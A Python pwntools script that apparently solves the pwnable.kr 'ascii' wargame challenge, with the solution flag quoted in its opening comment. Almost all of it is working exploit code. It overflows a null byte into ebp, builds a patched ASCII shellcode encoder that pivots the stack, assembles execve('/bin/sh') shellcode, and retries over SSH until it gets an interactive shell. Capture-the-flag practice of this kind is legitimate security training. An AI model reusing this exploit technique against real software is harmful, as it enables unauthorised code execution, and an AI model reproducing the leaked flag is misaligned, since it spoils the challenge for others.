#!/usr/bin/python3
#Flag is: "do you think ARM ascii shellcode is possible thing..?"

#we can overwrite a null to the end of ebp when returning from vuln() so when main exits 
#very much depending on the structure of the stack when the program starts it might return to our mmaped code
#there using encoders.i386.ascii_shellcode.AsciiShellcodeEncoder from pwntools 
#after patching it up a bit(to account for the stack pivot) we can generate
#ascii shellcode which first pivots the stack to the end of the ascii_shellcode part then it pushes actual instructions 
#which will be executed after the nop sled
from pwn import *

debug = False
context.terminal = ['tmux','new-window']
script = '''
b *0x08048f0c
'''
elf = ELF("./ascii")
if debug:
    def get_process():
        f = process("./ascii")
        gdb.attach(f,gdbscript=script)
        return f        
else:
    s1 = ssh("ascii",'pwnable.kr',port=2222,password="guest")
    def get_process():
        return s1.process('ascii')

context.update(arch='i386', os='linux')

CHARACTERS_REQUIRED_TO_OVERFLOW_NULL_TO_EBP = 167
ACTUALL_SLED_SIZE = 41 #the ascii_shellcode is CHARACTERS_REQUIRED_TO_OVERFLOW_NULL_TO_EBP - 41 ....
STARTING_ESP_OFFSET = 0xa0

class MyEncoder(encoders.i386.ascii_shellcode.AsciiShellcodeEncoder):
    @LocalContext
    def _get_allocator(self, size, vocab):
        size += 0x1e  # add typical allocator size
        size -= STARTING_ESP_OFFSET #account for the original 0xa0 in ecx
        int_size = context.bytes
        result = bytearray(b'QX')   # push ecx; pop eax 
                                    #this is the main difference from the factory version of this class since 
                                    #we pivot the stack based on the value from ecx rather then esp like normal
        target = bytearray(pack(size))
        for subtraction in self._calc_subtractions(
                bytearray(int_size), target, vocab):
            result += b'-' + subtraction
        result += b'P\\'
        pos, neg = self._find_negatives(vocab)
        result += flat((b'%', pos, b'%', neg))
        return result

sc = bytearray()
sc += asm("push   0x0068732f") #/sh\x00
sc += asm("push   0x6e69622f") #/bin
sc += asm("mov    ebx, esp")
sc += asm("xor    ecx, ecx")
sc += asm("xor    edx, edx")
sc += asm("push   0xb")
sc += asm("pop    eax")
sc += asm("int    0x80")

payload = MyEncoder(slop=ACTUALL_SLED_SIZE)(sc) 

print(sc)
print(f"The payload is: {payload.decode()}")
def try_shell(payload):
    """
        the exploit is statistically based on the layout of the stack when the program starts
        so this function tries to get shell on a single run
    """
    f = get_process()
    f.sendline(payload)
    f.recv()
    f.recv()

    f.sendline(b'whoami')
    print(f.recv())
    f.interactive()
 
    

while True :
    try:
        try_shell(payload)
        break
    except EOFError:
        print("Failed attempt...")
    